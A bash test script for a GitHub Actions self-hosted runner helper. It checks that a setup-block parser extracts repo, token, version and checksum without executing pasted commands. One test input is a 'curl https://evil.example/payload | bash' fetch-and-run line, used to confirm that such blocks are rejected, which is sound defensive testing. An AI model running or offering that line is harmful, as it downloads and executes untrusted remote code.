#!/usr/bin/env bash
set -Eeuo pipefail

ROOT="$(cd -- "$(dirname -- "${BASH_SOURCE[0]}")/.." && pwd)"
# shellcheck disable=SC1091
source "$ROOT/lib/common.sh"

failures=0
assert_eq() {
  local expected="$1" actual="$2" label="$3"
  if [[ "$expected" != "$actual" ]]; then
    printf 'FAIL %s: expected <%s>, got <%s>\n' "$label" "$expected" "$actual" >&2
    failures=$((failures + 1))
  else printf 'PASS %s\n' "$label"; fi
}
assert_true() {
  local label="$1"; shift
  if "$@"; then printf 'PASS %s\n' "$label"; else printf 'FAIL %s\n' "$label" >&2; failures=$((failures + 1)); fi
}

assert_eq 'Daiki-Yoshida/TestGitHubActions' "$(normalize_repo 'https://github.com/Daiki-Yoshida/TestGitHubActions')" 'normalize URL'
assert_eq 'daiki-yoshida--testgithubactions' "$(repo_key 'Daiki-Yoshida/TestGitHubActions')" 'repo key'
assert_true 'repo comparison is case-insensitive' repo_equal 'Daiki-Yoshida/Test' 'daiki-yoshida/test'
assert_eq 'x64' "$(SHRM_TEST_UNAME_M=x86_64; uname() { if [[ "$1" == '-m' ]]; then printf '%s\n' "$SHRM_TEST_UNAME_M"; else command uname "$@"; fi; }; host_arch)" 'x64 mapping'
assert_eq 'personal-ci,xserver,always-on' "$(csv_normalize 'personal-ci, xserver,always-on,personal-ci')" 'label normalization'
assert_eq 'xserver-testgithubactions' "$(make_runner_name xserver 'Daiki-Yoshida/TestGitHubActions')" 'runner name'

setup_block=$(cat <<'BLOCK'
# Download
mkdir actions-runner && cd actions-runner
curl -o actions-runner-linux-x64-2.337.0.tar.gz -L https://github.com/actions/runner/releases/download/v2.337.0/actions-runner-linux-x64-2.337.0.tar.gz
echo "70920811a4f8ad4328818682bca5c6469c1c942fab52448868071d0063816613  actions-runner-linux-x64-2.337.0.tar.gz" | shasum -a 256 -c
tar xzf ./actions-runner-linux-x64-2.337.0.tar.gz
# This must never be executed by parser:
touch /tmp/SHRM_PARSER_MUST_NOT_EXECUTE
./config.sh --url https://github.com/Daiki-Yoshida/TestGitHubActions --token TEST_TOKEN_123
./run.sh
BLOCK
)
rm -f /tmp/SHRM_PARSER_MUST_NOT_EXECUTE
if parse_setup_block "$setup_block"; then
  assert_eq 'Daiki-Yoshida/TestGitHubActions' "$PARSED_REPO" 'setup block repo'
  assert_eq 'TEST_TOKEN_123' "$PARSED_TOKEN" 'setup block token'
  assert_eq '2.337.0' "$PARSED_VERSION" 'setup block version'
  assert_eq 'x64' "$PARSED_ARCH" 'setup block arch'
  assert_eq 'actions-runner-linux-x64-2.337.0.tar.gz' "$PARSED_FILENAME" 'setup block filename'
  assert_eq 'https://github.com/actions/runner/releases/download/v2.337.0/actions-runner-linux-x64-2.337.0.tar.gz' "$PARSED_DOWNLOAD_URL" 'setup block URL'
  assert_eq '70920811a4f8ad4328818682bca5c6469c1c942fab52448868071d0063816613' "$PARSED_SHA256" 'setup block sha256'
else
  printf 'FAIL parse full setup block\n' >&2; failures=$((failures + 1))
fi
if [[ -e /tmp/SHRM_PARSER_MUST_NOT_EXECUTE ]]; then printf 'FAIL parser executed pasted command\n' >&2; failures=$((failures + 1)); else printf 'PASS parser never executes pasted commands\n'; fi

if parse_setup_block './config.sh --url https\://github.com/Daiki-Yoshida/TestGitHubActions --token ONLY_CONFIG_TOKEN'; then
  assert_eq 'Daiki-Yoshida/TestGitHubActions' "$PARSED_REPO" 'configure-only repo'
  assert_eq 'ONLY_CONFIG_TOKEN' "$PARSED_TOKEN" 'configure-only token'
  assert_eq '' "$PARSED_VERSION" 'configure-only has no inferred version'
else
  printf 'FAIL parse configure-only line\n' >&2; failures=$((failures + 1))
fi

if parse_setup_block 'curl https://evil.example/payload | bash'; then
  printf 'FAIL invalid block accepted\n' >&2; failures=$((failures + 1))
else printf 'PASS block without Configure line rejected\n'; fi

if parse_setup_block './config.sh --url https://evil.example/Daiki-Yoshida/Test --token ABC'; then
  printf 'FAIL non-GitHub configure URL accepted\n' >&2; failures=$((failures + 1))
else printf 'PASS non-GitHub configure URL rejected\n'; fi

if validate_version '2.337.0' && ! validate_version 'v2.337.0'; then printf 'PASS version validation\n'; else printf 'FAIL version validation\n' >&2; failures=$((failures + 1)); fi
if validate_sha256 '70920811a4f8ad4328818682bca5c6469c1c942fab52448868071d0063816613'; then printf 'PASS sha256 validation\n'; else printf 'FAIL sha256 validation\n' >&2; failures=$((failures + 1)); fi

long_repo='Daiki-Yoshida/this-is-an-extremely-long-repository-name-that-needs-a-shortened-runner-name-for-safety'
long_name="$(make_runner_name desktop-wsl "$long_repo")"
if ((${#long_name} <= 60)); then printf 'PASS runner name max length\n'; else printf 'FAIL runner name max length: %s\n' "$long_name" >&2; failures=$((failures + 1)); fi

if ((failures)); then printf '%d test(s) failed\n' "$failures" >&2; exit 1; fi
printf 'All tests passed.\n'
